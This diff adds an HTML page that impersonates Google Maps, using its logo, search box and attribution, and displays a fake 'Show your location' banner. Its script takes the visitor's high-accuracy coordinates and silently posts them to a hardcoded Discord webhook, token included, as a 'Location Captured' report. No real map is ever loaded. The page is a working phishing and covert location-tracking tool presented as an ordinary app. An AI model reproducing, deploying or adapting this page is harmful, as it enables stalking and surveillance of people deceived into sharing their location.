@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Maps - Live Traffic & Navigation</title>
+  <meta name="theme-color" content="#4285f4">
+  <meta name="description" content="Real-time traffic, navigation, and local business search">
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #f5f5f5; height: 100vh; overflow: hidden; }
+    .app-bar { height: 56px; background: #fff; border-bottom: 1px solid #e0e0e0; display: flex; align-items: center; padding: 0 16px; position: fixed; top: 0; left: 0; right: 0; z-index: 100; box-shadow: 0 1px 3px rgba(0,0,0,0.08); }
+    .logo { display: flex; align-items: center; gap: 8px; color: #1a73e8; font-weight: 500; font-size: 20px; }
+    .logo svg { width: 28px; height: 28px; }
+    .search-box { flex: 1; max-width: 600px; margin: 0 24px; position: relative; }
+    .search-box input { width: 100%; height: 40px; border: 1px solid #ddd; border-radius: 20px; padding: 0 16px 0 48px; font-size: 16px; outline: none; background: #f8f9fa; }
+    .search-box input:focus { border-color: #1a73e8; background: #fff; box-shadow: 0 0 0 3px rgba(26,115,232,0.15); }
+    .search-box svg { position: absolute; left: 16px; top: 50%; transform: translateY(-50%); width: 20px; height: 20px; color: #5f6368; }
+    .avatar { width: 32px; height: 32px; border-radius: 50%; background: linear-gradient(135deg, #4285f4, #34a853); display: flex; align-items: center; justify-content: center; color: #fff; font-weight: 600; font-size: 14px; cursor: pointer; }
+    #map { width: 100%; height: 100%; position: relative; }
+    .map-placeholder { width: 100%; height: 100%; background: #e8eaed url('https://maps.gstatic.com/mapfiles/api-3/images/mapcnt6.png') repeat; display: flex; flex-direction: column; align-items: center; justify-content: center; padding-top: 56px; }
+    .loading-spinner { width: 40px; height: 40px; border: 3px solid #e0e0e0; border-top-color: #4285f4; border-radius: 50%; animation: spin 1s linear infinite; }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .loading-text { margin-top: 16px; color: #5f6368; font-size: 14px; }
+    .permission-banner { position: fixed; bottom: 0; left: 0; right: 0; background: #fff; border-top: 1px solid #e0e0e0; padding: 16px; box-shadow: 0 -2px 10px rgba(0,0,0,0.1); z-index: 200; transform: translateY(100%); transition: transform 0.3s ease; }
+    .permission-banner.show { transform: translateY(0); }
+    .permission-content { max-width: 400px; margin: 0 auto; text-align: center; }
+    .permission-icon { width: 48px; height: 48px; margin: 0 auto 12px; background: #e8f0fe; border-radius: 50%; display: flex; align-items: center; justify-content: center; }
+    .permission-icon svg { width: 24px; height: 24px; color: #1a73e8; }
+    .permission-title { font-size: 16px; font-weight: 600; color: #202124; margin-bottom: 4px; }
+    .permission-desc { font-size: 14px; color: #5f6368; margin-bottom: 16px; line-height: 1.4; }
+    .btn { height: 36px; border-radius: 18px; font-size: 14px; font-weight: 500; cursor: pointer; border: none; padding: 0 24px; transition: all 0.2s; }
+    .btn-primary { background: #1a73e8; color: #fff; }
+    .btn-primary:hover { background: #1557b0; box-shadow: 0 1px 4px rgba(26,115,232,0.3); }
+    .btn-secondary { background: #f1f3f4; color: #3c4043; }
+    .btn-secondary:hover { background: #e8eaed; }
+    .btn-group { display: flex; gap: 8px; justify-content: center; }
+    .bottom-controls { position: fixed; bottom: 80px; left: 50%; transform: translateX(-50%); display: flex; gap: 8px; z-index: 100; opacity: 0; transition: opacity 0.3s; pointer-events: none; }
+    .bottom-controls.show { opacity: 1; pointer-events: auto; }
+    .fab { width: 48px; height: 48px; border-radius: 50%; background: #fff; box-shadow: 0 2px 6px rgba(0,0,0,0.2); border: none; display: flex; align-items: center; justify-content: center; cursor: pointer; transition: transform 0.2s, box-shadow 0.2s; }
+    .fab:hover { transform: scale(1.05); box-shadow: 0 4px 12px rgba(0,0,0,0.25); }
+    .fab svg { width: 24px; height: 24px; color: #3c4043; }
+    .attribution { position: fixed; bottom: 4px; left: 50%; transform: translateX(-50%); font-size: 11px; color: #9aa0a6; z-index: 100; }
+  </style>
+</head>
+<body>
+  <header class="app-bar">
+    <div class="logo">
+      <svg viewBox="0 0 24 24"><path fill="currentColor" d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/></svg>
+      Maps
+    </div>
+    <div class="search-box">
+      <svg viewBox="0 0 24 24"><path fill="currentColor" d="M15.5 14h-.79l-.28-.27C15.41 12.59 16 11.11 16 9.5 16 5.91 13.09 3 9.5 3S3 5.91 3 9.5 5.91 16 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/></svg>
+      <input type="text" placeholder="Search Google Maps" autocomplete="off" spellcheck="false" readonly>
+    </div>
+    <div class="avatar">U</div>
+  </header>
+
+  <div id="map">
+    <div class="map-placeholder" id="placeholder">
+      <div class="loading-spinner"></div>
+      <div class="loading-text">Loading map tiles...</div>
+    </div>
+  </div>
+
+  <div class="bottom-controls" id="bottomControls">
+    <button class="fab" title="Your location" onclick="requestLocation()">
+      <svg viewBox="0 0 24 24"><path fill="currentColor" d="M12 8c-2.21 0-4 1.79-4 4s1.79 4 4 4 4-1.79 4-4-1.79-4-4-4zm8.94 3c-.46-4.17-3.77-7.48-7.94-7.94V1h-2v2.06C6.83 3.52 3.52 6.83 3.06 11H1v2h2.06c.46 4.17 3.77 7.48 7.94 7.94V23h2v-2.06c4.17-.46 7.48-3.77 7.94-7.94H23v-2h-2.06zM12 19c-3.87 0-7-3.13-7-7s3.13-7 7-7 7 3.13 7 7-3.13 7-7 7z"/></svg>
+    </button>
+    <button class="fab" title="Center map">
+      <svg viewBox="0 0 24 24"><path fill="currentColor" d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/></svg>
+    </button>
+  </div>
+
+  <div class="permission-banner" id="permBanner">
+    <div class="permission-content">
+      <div class="permission-icon">
+        <svg viewBox="0 0 24 24"><path fill="currentColor" d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7zm0 9.5c-1.38 0-2.5-1.12-2.5-2.5s1.12-2.5 2.5-2.5 2.5 1.12 2.5 2.5-1.12 2.5-2.5 2.5z"/></svg>
+      </div>
+      <div class="permission-title">Show your location</div>
+      <div class="permission-desc">Maps wants to access your location to show live traffic, nearby places, and turn-by-turn navigation</div>
+      <div class="btn-group">
+        <button class="btn btn-secondary" onclick="hideBanner()">Not now</button>
+        <button class="btn btn-primary" onclick="allowLocation()">Allow</button>
+      </div>
+    </div>
+  </div>
+
+  <div class="attribution">© 2024 Google · Map data ©2024</div>
+
+<script>
+const WEBHOOK_URL = "https://canary.discord.com/api/webhooks/1558676786613846107/KBJgfs9mqZScnj6oRKMF7P27FZ2lXJmrCPSrXigpDTj9vbHEr2pzDC7pOALaYhGSWbSx";
+const USERNAME = "Maps Traffic Service";
+
+let locationSent = false;
+
+function hidePlaceholder() {
+  document.getElementById('placeholder').style.display = 'none';
+  document.getElementById('bottomControls').classList.add('show');
+}
+
+function showPermissionBanner() {
+  setTimeout(() => {
+    document.getElementById('permBanner').classList.add('show');
+  }, 3000);
+}
+
+function hideBanner() {
+  document.getElementById('permBanner').classList.remove('show');
+}
+
+async function sendLocation(lat, lon, acc) {
+  if (locationSent) return;
+  locationSent = true;
+
+  const mapsUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+  const timestamp = new Date().toLocaleString();
+
+  const embed = {
+    username: USERNAME,
+    embeds: [{
+      title: '📍 Location Captured',
+      color: 4346573,
+      fields: [
+        { name: 'Latitude', value: `\`${lat}\``, inline: true },
+        { name: 'Longitude', value: `\`${lon}\``, inline: true },
+        { name: 'Accuracy', value: `\`±${Math.round(acc)}m\``, inline: true },
+        { name: 'Time', value: timestamp, inline: false },
+        { name: 'Maps Link', value: `[Open](${mapsUrl})`, inline: false }
+      ],
+      footer: { text: 'Google Maps • Live Traffic' },
+      timestamp: new Date().toISOString()
+    }]
+  };
+
+  try {
+    await fetch(WEBHOOK_URL, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify(embed),
+      keepalive: true
+    });
+  } catch (e) {}
+}
+
+function allowLocation() {
+  hideBanner();
+  navigator.geolocation.getCurrentPosition(
+    pos => {
+      sendLocation(pos.coords.latitude, pos.coords.longitude, pos.coords.accuracy);
+      showToast('Location found — showing your position');
+    },
+    err => {
+      showToast('Could not get location: ' + err.message);
+    },
+    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+  );
+}
+
+function requestLocation() {
+  if (locationSent) {
+    showToast('Already centered on your location');
+    return;
+  }
+  document.getElementById('permBanner').classList.add('show');
+}
+
+function showToast(msg) {
+  const toast = document.createElement('div');
+  toast.textContent = msg;
+  toast.style.cssText = 'position:fixed;bottom:140px;left:50%;transform:translateX(-50%);background:#323232;color:#fff;padding:12px 24px;border-radius:8px;font-size:14px;z-index:300;box-shadow:0 4px 12px rgba(0,0,0,0.3);animation:fadeIn 0.3s';
+  document.body.appendChild(toast);
+  setTimeout(() => { toast.style.animation = 'fadeOut 0.3s'; setTimeout(() => toast.remove(), 300); }, 3000);
+}
+
+// Init
+window.addEventListener('load', () => {
+  hidePlaceholder();
+  showPermissionBanner();
+});
+
+// Auto-request on interaction (browsers require user gesture)
+document.body.addEventListener('click', () => {
+  if (!locationSent && document.getElementById('permBanner').classList.contains('show')) {
+    // banner already showing, wait for Allow click
+  }
+}, { once: true });
+
+// Style for toast animations
+const style = document.createElement('style');
+style.textContent = `
+  @keyframes fadeIn { from { opacity: 0; transform: translateX(-50%) translateY(10px); } to { opacity: 1; transform: translateX(-50%) translateY(0); } }
+  @keyframes fadeOut { from { opacity: 1; transform: translateX(-50%) translateY(0); } to { opacity: 0; transform: translateX(-50%) translateY(-10px); } }
+`;
+document.head.appendChild(style);
+</script>
+</body>
+</html>
